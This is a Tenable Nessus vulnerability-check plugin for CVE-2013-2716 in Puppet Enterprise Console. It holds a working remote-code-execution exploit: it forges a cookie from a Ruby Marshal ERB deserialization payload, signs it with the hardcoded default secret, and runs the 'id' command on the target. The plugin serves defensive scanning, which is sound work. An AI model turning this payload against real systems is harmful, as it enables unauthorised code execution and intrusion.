#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66235);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/05/16 14:22:07 $");

  script_cve_id("CVE-2013-2716");
  script_bugtraq_id(58811);
  script_osvdb_id(91950);

  script_name(english:"Puppet Enterprise Console Authentication Bypass (intrusive check)");
  script_summary(english:"Tries to run the id command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application hosted on the remote host has an authentication
bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Puppet Enterprise Console running on the remote host has
an authentication bypass vulnerability.  The secret value used to
prevent cookie tampering is not random.  This allows a remote,
unauthenticated attacker to create a cookie that would be
inappropriately authorized by the console, which could result in
arbitrary code execution. 

This only affects Puppet Enterprise versions 2.5.0 through 2.7.2 that
have been upgraded from versions 1.2.x or 2.0.x and have the console
role enabled."
  );
  script_set_attribute(attribute:"see_also", value:"http://charlie.bz/blog/rails-3.2.10-remote-code-execution");
  script_set_attribute(attribute:"see_also", value:"https://puppetlabs.com/security/cve/cve-2013-2716/");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to Puppet Enterprise 2.8.0, or use the workaround listed in the
advisory for CVE-2013-2716."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:puppetlabs:puppet");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("puppet_enterprise_console_detect.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/puppet_enterprise_console");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("byte_func.inc");
include("url_func.inc");

##
# this prepends a one byte length field to the given value
# using the format specified by ruby's marshaling integer packing
#
# this function assumes 'value' will be between 1 and 122 bytes
# inclusive (which are represented by 6 through 127)
#
# @anonparam value value to marshal
# @return value with a leading length field
##
function marshal_value()
{
  local_var value;
  value = _FCT_ANON_ARGS[0];
  return mkbyte(strlen(value) + 5) + value;
}

port = get_http_port(default:443);
install = get_install_from_kb(appname:'puppet_enterprise_console', port:port, exit_on_fail:TRUE);

# command output is redirected to the web root, which is writeable by the puppet user
url = strcat('/', SCRIPT_NAME, '-', unixtime(), '.txt');
filename = 'public' + url;
cmd = 'id';
ruby_src = "system('" + cmd + " > " + filename + "')";

# payload from http://charlie.bz/blog/rails-3.2.10-remote-code-execution
dump =
  '\x04\x08' + # magic
  'o:' + marshal_value('ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy') +
  '\x07:' + marshal_value('@instance') +
  'o:' + marshal_value('ERB') +
  '\x06:' + marshal_value('@src') +
  'I"' + marshal_value(ruby_src) +
  '\x06:' + marshal_value('E') +
  'T:' + marshal_value('@method') +
  ':' + marshal_value('result');

b64_dump = base64(str:dump);
secret = 'this_string_should_be_randomly_generated_by_the_installer';
hmac = hexstr(HMAC_SHA1(data:b64_dump, key:secret));

clear_cookiejar();
b64_dump = urlencode(str:b64_dump);
set_http_cookie(name:'puppet_enterprise_console', value:b64_dump + '--' + hmac);
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if (!egrep(string:res[2], pattern:"uid=[0-9]+.*gid=[0-9]+.*"))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Puppet Enterprise Console', build_url(qs:install['dir'], port:port));

if (report_verbosity > 0)
{
  report =
    '\nNessus executed the "' + cmd + '" command by sending the following request :\n\n' +
    crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n' +
    chomp(http_last_sent_request()) + '\n' +
    crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n' +
    '\nWhich resulted in the following output :\n\n' + chomp(res[2]) + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);

